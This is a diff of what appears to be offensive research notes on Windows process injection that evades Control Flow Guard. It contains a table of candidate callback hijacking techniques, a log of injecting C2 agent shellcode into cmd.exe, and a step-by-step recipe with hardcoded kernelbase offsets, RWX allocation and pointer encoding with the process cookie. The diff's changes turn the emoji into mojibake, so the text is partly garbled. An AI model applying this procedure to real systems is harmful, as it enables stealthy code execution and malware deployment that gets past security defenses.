 
 ## CFG Protection Summary
 
 | Technique | CFG Protected? | Status |
 |-----------|---------------|--------|
-| Variant 1: Ctrl-C Handlers | ❌ No | ✅ **WORKING** |
-| Variant 2: WNF Callbacks | ✅ Yes | ❌ Blocked |
-| Variant 3: FLS Callbacks | ✅ Yes | ❌ Blocked |
-| Candidate C: Exception Filter | ✅ Yes | ❌ Blocked |
-| Candidate G: ETW Consumer Callbacks | ✅ Yes | ❌ Blocked |
-| Candidate D: DLL Notifications | ✅ Yes | ❌ Blocked |
-| Candidate H: RPC Dispatch Tables | ✅ Yes | ❌ Blocked |
-| Candidate A: TEB TxnScope | N/A | ❌ Vestigial (never called) |
+| Variant 1: Ctrl-C Handlers | âŒ No | âœ… **WORKING** |
+| Variant 2: WNF Callbacks | âœ… Yes | âŒ Blocked |
+| Variant 3: FLS Callbacks | âœ… Yes | âŒ Blocked |
+| Candidate C: Exception Filter | âœ… Yes | âŒ Blocked |
+| Candidate G: ETW Consumer Callbacks | âœ… Yes | âŒ Blocked |
+| Candidate D: DLL Notifications | âœ… Yes | âŒ Blocked |
+| Candidate H: RPC Dispatch Tables | âœ… Yes | âŒ Blocked |
+| Candidate A: TEB TxnScope | N/A | âŒ Vestigial (never called) |
 | Candidate I: Application Recovery | Unknown | Queued |
 | Candidate J: Memory Resource Notify | Unknown (likely CFG) | Queued |
 
 ## Recommended Investigation Order (Updated)
 
 ### Phase 1: Top Priority - Truly Novel Techniques
-1. **Candidate G: ETW Consumer Callbacks** - 🔍 INVESTIGATING NOW
+1. **Candidate G: ETW Consumer Callbacks** - ðŸ” INVESTIGATING NOW
    - Extremely obscure, natural triggers, broad applicability
-2. **Candidate H: RPC Dispatch Tables** - 🔍 INVESTIGATING NOW
+2. **Candidate H: RPC Dispatch Tables** - ðŸ” INVESTIGATING NOW
    - Pattern-matches Variant 1, controllable triggers, ubiquitous
-3. **Candidate I: Application Recovery Callbacks** - 🔍 INVESTIGATING NOW
+3. **Candidate I: Application Recovery Callbacks** - ðŸ” INVESTIGATING NOW
    - Natural triggers, interesting targets, likely obscure
 
 ### Phase 2: Previously Identified
-4. **Candidate D: LdrpDllNotificationList** - 🔍 INVESTIGATING NOW
+4. **Candidate D: LdrpDllNotificationList** - ðŸ” INVESTIGATING NOW
    - Easy trigger, similar to Variant 1 list manipulation
 
 ### Phase 3: Lower Priority
@@ -2193,11 +2193,11 @@ Look for where the dispatch table function pointers are actually called. May nee
 
 | Date | Variant | Target | Shellcode | Result |
 |------|---------|--------|-----------|--------|
-| 2025 | 1 | cmd.exe | calc.bin | ✅ Success (manual trigger) |
-| 2025 | 1 | cmd.exe | calc.bin | ✅ Success (auto trigger) |
-| 2025 | 1 | cmd.exe | Fawkes (Go) | ❌ Failed - runtime issue |
-| 2025 | 1 | cmd.exe | Apollo (C#) | ❌ Failed - CLR issue |
-| 2025 | 1 | cmd.exe | Xenon (C) | ✅ Success |
+| 2025 | 1 | cmd.exe | calc.bin | âœ… Success (manual trigger) |
+| 2025 | 1 | cmd.exe | calc.bin | âœ… Success (auto trigger) |
+| 2025 | 1 | cmd.exe | Killa (Go) | âŒ Failed - runtime issue |
+| 2025 | 1 | cmd.exe | Apollo (C#) | âŒ Failed - CLR issue |
+| 2025 | 1 | cmd.exe | Xenon (C) | âœ… Success |
 
 ---
 
@@ -2215,17 +2215,17 @@ Look for where the dispatch table function pointers are actually called. May nee
 
 ```
 1. OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION)
-2. EnumProcessModulesEx → find kernelbase.dll base
+2. EnumProcessModulesEx â†’ find kernelbase.dll base
 3. Calculate:
    - pHandlerList = kernelbase + 0x399490
    - pHandlerListLength = kernelbase + 0x39CBB0
    - pAllocatedLength = kernelbase + 0x39CBB4
-4. ReadProcessMemory(pHandlerList) → handlerArrayAddr
-5. ReadProcessMemory(pHandlerListLength) → count
-6. ReadProcessMemory(pAllocatedLength) → capacity
+4. ReadProcessMemory(pHandlerList) â†’ handlerArrayAddr
+5. ReadProcessMemory(pHandlerListLength) â†’ count
+6. ReadProcessMemory(pAllocatedLength) â†’ capacity
 7. Verify count < capacity
-8. NtQueryInformationProcess(ProcessCookie) → cookie
-9. VirtualAllocEx(PAGE_EXECUTE_READWRITE) → shellcodeAddr
+8. NtQueryInformationProcess(ProcessCookie) â†’ cookie
+9. VirtualAllocEx(PAGE_EXECUTE_READWRITE) â†’ shellcodeAddr
 10. WriteProcessMemory(shellcodeAddr, shellcode)
 11. encodedAddr = ROR(shellcodeAddr XOR cookie, cookie & 0x3F)
 12. targetSlot = handlerArrayAddr + (count * 8)
